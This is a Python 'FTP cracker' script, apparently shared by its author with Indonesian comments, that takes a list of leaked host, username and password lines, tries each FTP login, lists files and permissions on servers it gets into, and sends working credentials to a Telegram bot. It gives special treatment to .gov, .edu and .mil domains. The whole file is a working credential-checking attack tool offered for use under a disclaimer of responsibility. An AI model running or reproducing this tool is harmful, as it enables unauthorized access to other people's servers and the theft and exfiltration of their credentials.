import os
from ftplib import FTP, error_perm
from rich.console import Console
from datetime import datetime
import requests
from pystyle import Colors, Colorate, Center

# Ganti dengan Token Bot Telegram dan Chat ID mu
TELEGRAM_TOKEN = ''  # Ganti dengan token bot Telegram mu
CHAT_ID = ''  # Ganti dengan chat ID atau ID grup mu

# Daftar domain yang akan diperiksa
SECURE_DOMAINS = ['.gov', '.edu', '.gouv', '.org', '.mil', '.int', 'gob']

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    console = Console()
    console.print(banner, description)

description = """
         .-.
       .'   `.          ----------------------------
       :g g   :         | GHOST - FTP CRACKER LOGIN|  
       : o    `.        |       @CODE BY YamiFool1337   |
      :         ``.     ----------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     . 
              `'`'`'`---..,___`;.-'

              Script ini dirancang untuk menguji login server FTP menggunakan kredensial (username dan password) yang disediakan dalam file input.
              Script ini memeriksa apakah domain termasuk dalam kategori aman, seperti .gov, .edu, .org, dll.
              Ketika login FTP berhasil dilakukan pada domain yang aman, script akan mengirimkan peringatan melalui API Telegram.
              Login yang berhasil disimpan dalam file Good_Ftp.txt, sedangkan login yang gagal disimpan dalam file Bad_Ftp.txt.
              Script ini secara otomatis mendeteksi berbagai format FTP dari file input.
"""

banner = """
          #Kontak : t.me/YamiFool1337
          #Github  : https://github.com/YamiFool1337
          #Lisensi : MIT  
          [Peringatan] Saya tidak bertanggung jawab atas cara Anda menggunakan program ini [Peringatan]"""

print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(banner)))
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(description)))

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    response = requests.get(url, params=params)
    return response.json()

def check_ftp_login(hostname, port=21, user=None, password=None):
    try:
        ftp = FTP()
        ftp.connect(hostname, port, timeout=10)
        ftp.login(user, password)

        # Mendapatkan daftar file dan folder dari direktori saat ini
        files = ftp.nlst()  # Daftar file dan folder
        file_permissions = {}
        for file in files:
            try:
                # Menggunakan LIST untuk mendapatkan informasi setiap file
                file_info = ftp.sendcmd(f"LIST {file}")
                file_permissions[file] = file_info.split()[0]
            except Exception as e:
                file_permissions[file] = f"Tidak dapat mengambil izin: {e}"
        
        ftp.quit()
        return True, file_permissions
    except (error_perm, Exception) as e:
        return False, {}

def check_domain_security_and_send_alert(hostname, user, password):
    """Memeriksa apakah domain termasuk dalam kategori aman dan jika login FTP berhasil."""
    for domain in SECURE_DOMAINS:
        if domain in hostname:
            print(f"\n[] Peringatan keamanan dipicu untuk domain: {hostname}")
            
            # Jika domain aman, coba koneksi FTP
            success, file_permissions = check_ftp_login(hostname, user=user, password=password)
            if success:
                # Kirim peringatan ke Telegram hanya jika koneksi FTP berhasil
                message = f"[] \033[1;31m[Peringatan Keamanan] Domain {hostname} termasuk dalam kategori keamanan tinggi ({domain}). Koneksi berhasil!\033[0m\n"
                message += f"[] Detail:\nUsername: {user}\nPassword: {password}"
                send_telegram_message(message)
                return True
            else:
                print(f"Gagal login ke {hostname} meskipun domainnya aman.")
    return False

def parse_ftp_line(line):
    """Fungsi untuk mendeteksi dan memparse berbagai format FTP"""
    line = line.strip()
    if not line:
        return None
    
    # Hapus 'Source:' jika ada
    if line.startswith('Source:'):
        line = line[7:].strip()
    
    # Hapus 'FR ' jika ada
    if line.startswith('FR '):
        line = line[3:].strip()
    
    # Format: ftp://host:port/user:pass atau ftp://host/user:pass
    if line.startswith('ftp://'):
        line = line[6:]  # Hapus ftp://
    
    # Handle berbagai format separator
    
    # Format dengan pipe (|) seperti di data Anda
    if '|' in line and 'ftp://' not in line:
        parts = line.split('|')
        if len(parts) >= 3:
            host = parts[0].strip()
            user = parts[1].strip()
            password = parts[2].strip()
            port = 21
            return {'host': host, 'port': port, 'user': user, 'password': password}
    
    # Format dengan colon (:) dan slash (/)
    if '/' in line and ':' in line:
        # Coba parse format: host:port/user:pass atau host/user:pass
        try:
            # Pisahkan host:port dari user:pass
            if '/:' in line:  # Format dengan /: separator
                host_part, auth_part = line.split('/:', 1)
            elif '/ ' in line:  # Format dengan spasi setelah slash
                parts = line.split('/ ', 1)
                if len(parts) == 2:
                    host_part = parts[0]
                    auth_part = parts[1]
                else:
                    host_part, auth_part = line.split('/', 1)
            else:
                host_part, auth_part = line.split('/', 1)
            
            # Parse host dan port
            if ':' in host_part:
                host, port_str = host_part.split(':', 1)
                try:
                    port = int(port_str.split('/')[0] if '/' in port_str else port_str)
                except:
                    port = 21
            else:
                host = host_part
                port = 21
            
            # Parse user dan password
            auth_part = auth_part.strip()
            
            # Handle berbagai separator untuk auth
            if ':' in auth_part:
                user, password = auth_part.split(':', 1)
            elif ' ' in auth_part:
                # Mungkin format: user pass dengan spasi
                parts = auth_part.split()
                if len(parts) >= 2:
                    user = parts[0]
                    password = ' '.join(parts[1:])
                else:
                    return None
            else:
                return None
            
            # Bersihkan data
            host = host.strip()
            user = user.strip()
            password = password.strip().rstrip(':')
            
            return {'host': host, 'port': port, 'user': user, 'password': password}
        except Exception as e:
            pass
    
    # Format dengan colon saja
    if ':' in line and line.count(':') >= 2:
        parts = line.split(':')
        if len(parts) == 3:
            host, user, password = parts
            return {'host': host, 'port': 21, 'user': user, 'password': password}
        elif len(parts) == 4:
            host, user, password, port_str = parts
            try:
                port = int(port_str)
            except:
                port = 21
            return {'host': host, 'port': port, 'user': user, 'password': password}
    
    # Format dengan spasi seperti di data: "host : user : password"
    if ':' in line and ' ' in line:
        # Hapus spasi di sekitar colon
        line = line.replace(' : ', ':').replace(' :', ':').replace(': ', ':')
        parts = line.split(':')
        if len(parts) >= 3:
            host = parts[0].strip()
            user = parts[1].strip()
            password = ':'.join(parts[2:]).strip()
            return {'host': host, 'port': 21, 'user': user, 'password': password}
    
    return None

def process_ftp_file(input_file):
    good_file = "Good_Ftp.txt"
    bad_file = "Bad_Ftp.txt"
    
    # Hitung total baris untuk progress
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as infile:
        total_lines = sum(1 for line in infile if line.strip())
    
    processed = 0
    success_count = 0
    fail_count = 0
    
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as infile:
        with open(good_file, 'w', encoding='utf-8') as good_outfile, \
             open(bad_file, 'w', encoding='utf-8') as bad_outfile:
            
            for line in infile:
                if not line.strip():
                    continue
                
                processed += 1
                print(f"\n\033[1;34m[Memproses {processed}/{total_lines}]\033[0m")
                
                # Parse line untuk mendapatkan kredensial
                credentials = parse_ftp_line(line)
                
                if not credentials:
                    print(f"\033[1;31m[!] Gagal memparse baris: {line.strip()}\033[0m")
                    bad_outfile.write(f"# PARSE ERROR: {line}")
                    fail_count += 1
                    continue
                
                hostname = credentials['host']
                port = credentials['port']
                user = credentials['user']
                password = credentials['password']
                
                # Tampilkan informasi yang diparse
                print(f"\033[1;33m[+] Host: {hostname}\033[0m")
                print(f"\033[1;36m[+] Port: {port}\033[0m")
                print(f"\033[1;32m[+] User: {user}\033[0m")
                print(f"\033[1;35m[+] Pass: {password}\033[0m")
                
                # Memeriksa keamanan domain dan mencoba koneksi FTP
                check_domain_security_and_send_alert(hostname, user, password)
                
                current_time = datetime.now().strftime("%H:%M:%S")
                
                success, file_permissions = check_ftp_login(hostname, port, user, password)
                
                if success:
                    success_count += 1
                    good_outfile.write(line + '\n')
                    print(f"\n[\033[1;33m{current_time}\033[0m\033[1m] - [\033[1;37m{hostname}\033[0m\033[1m] - [\033[1;34m{user}\033[0m\033[1m] - [\033[1;34m{password}\033[0m\033[1m] - [\033[1;32m✓ BERHASIL LOGIN\033[0m\033[1m]")
                    
                    # Menyiapkan pesan untuk Telegram
                    message = f"✅ FTP BERHASIL!\nHostname: {hostname}\nPort: {port}\n" 
                    message += f"Username: {user}\n"
                    message += f"Password: {password}\n"
                    message += "📁 Izin file:\n"
                    for file, perm in list(file_permissions.items())[:10]:  # Batasi 10 file pertama
                        message += f"  {file}: {perm}\n"
                    
                    # Mengirim pesan via Telegram
                    send_telegram_message(message)
                else:
                    fail_count += 1
                    bad_outfile.write(line + '\n')
                    print(f"\n[\033[1;33m{current_time}\033[0m\033[1m] - [\033[1;37m{hostname}\033[0m\033[1m] - [\033[1;34m{user}\033[0m\033[1m] - [\033[1;34m{password}\033[0m\033[1m] - [\033[1;31m✗ GAGAL LOGIN\033[0m\033[1m]")

    # Tampilkan ringkasan
    print(f"\n\033[1;36m{'='*60}\033[0m")
    print(f"\033[1;32m✅ RINGKASAN:\033[0m")
    print(f"\033[1;32m   Total diproses: {processed}\033[0m")
    print(f"\033[1;32m   Berhasil: {success_count}\033[0m")
    print(f"\033[1;31m   Gagal: {fail_count}\033[0m")
    print(f"\033[1;32m   Login berhasil disimpan di: '{good_file}'\033[0m")
    print(f"\033[1;31m   Login gagal disimpan di: '{bad_file}'\033[0m")
    print(f"\033[1;36m{'='*60}\033[0m")

def main():
    clear_terminal()
    print_banner()

    # Langsung minta file input tanpa pilihan format
    input_file = input("\n\033[1;34m[] Masukkan nama file daftar FTP \033[1;93m: \033[1;37m")
    
    if not os.path.exists(input_file):
        print(f"\033[1;31m[!] File '{input_file}' tidak ditemukan!\033[0m")
        return
    
    print(f"\033[1;32m[+] Memproses file: {input_file}\033[0m")
    print(f"\033[1;33m[+] Mendeteksi format secara otomatis...\033[0m\n")
    
    process_ftp_file(input_file)

if __name__ == "__main__":
    main()
